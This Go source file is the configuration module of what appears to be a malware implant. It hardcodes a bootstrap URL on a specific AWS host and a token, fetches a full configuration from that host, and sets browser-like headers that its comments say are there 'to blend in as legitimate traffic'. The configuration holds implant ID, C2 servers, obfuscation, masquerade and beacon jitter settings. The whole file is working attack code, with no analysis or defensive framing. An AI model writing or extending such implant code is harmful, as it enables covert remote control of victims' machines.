package config

import (
	"encoding/json"
	"fmt"
	"net/http"
	"time"
)

type Config struct {
	ImplantID       string    `json:"implant_id"`
	ServerList      []string  `json:"servers"`
	Password        string    `json:"password"`
	SNI             string    `json:"sni"`
	Obfs            string    `json:"obfs"`
	Masquerade      string    `json:"masquerade"`
	BaseInterval    int       `json:"base_interval"`
	Jitter          int       `json:"jitter"`
	CryptoKey       []byte    `json:"crypto_key"`
	SubscriptionURL string    `json:"subscription_url"`
	Token           string    `json:"token"`
	LastCheckin     time.Time `json:"last_checkin"`
	FirstRun        bool      `json:"first_run"`
}

func LoadBootstrap() *Config {
	return &Config{
		SubscriptionURL: "https://ec2-3-24-124-58.ap-southeast-2.compute.amazonaws.com/api/sub/hysteria2?token=INITIAL_TOKEN&implant=true",
		Token:           "dpanel-implant-bootstrap-token-change-this",
		BaseInterval:    45,
		Jitter:          25,
		FirstRun:        true,
	}
}

func FetchFullConfigFromSubscription(cfg *Config) error {
	client := &http.Client{
		Timeout: 30 * time.Second,
		// Add user agent to blend in
		Transport: &http.Transport{
			Proxy: http.ProxyFromEnvironment,
		},
	}

	req, err := http.NewRequest("GET", cfg.SubscriptionURL, nil)
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}

	// Add headers to blend in as legitimate traffic
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("subscription request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("D-Panel subscription returned %d", resp.StatusCode)
	}

	// Parse the response
	var subResponse struct {
		ImplantID  string   `json:"implant_id"`
		Servers    []string `json:"servers"`
		Password   string   `json:"password"`
		SNI        string   `json:"sni"`
		Obfs       string   `json:"obfs"`
		Masquerade string   `json:"masquerade"`
		CryptoKey  string   `json:"crypto_key"`
		Interval   int      `json:"interval"`
		Jitter     int      `json:"jitter"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&subResponse); err != nil {
		return fmt.Errorf("failed to decode subscription response: %w", err)
	}

	// Update config with received data
	cfg.ImplantID = subResponse.ImplantID
	cfg.ServerList = subResponse.Servers
	cfg.Password = subResponse.Password
	cfg.SNI = subResponse.SNI
	cfg.Obfs = subResponse.Obfs
	cfg.Masquerade = subResponse.Masquerade
	cfg.BaseInterval = subResponse.Interval
	cfg.Jitter = subResponse.Jitter
	cfg.LastCheckin = time.Now()
	cfg.FirstRun = false

	// Decode crypto key if provided
	if subResponse.CryptoKey != "" {
		// In a real implementation, this would be base64 decoded
		cfg.CryptoKey = []byte(subResponse.CryptoKey)
	}

	fmt.Printf("[+] Successfully fetched config from D-Panel\n")
	fmt.Printf("[+] Implant ID: %s\n", cfg.ImplantID)
	fmt.Printf("[+] Servers: %v\n", cfg.ServerList)
	fmt.Printf("[+] Beacon interval: %ds ±%ds\n", cfg.BaseInterval, cfg.Jitter)

	return nil
}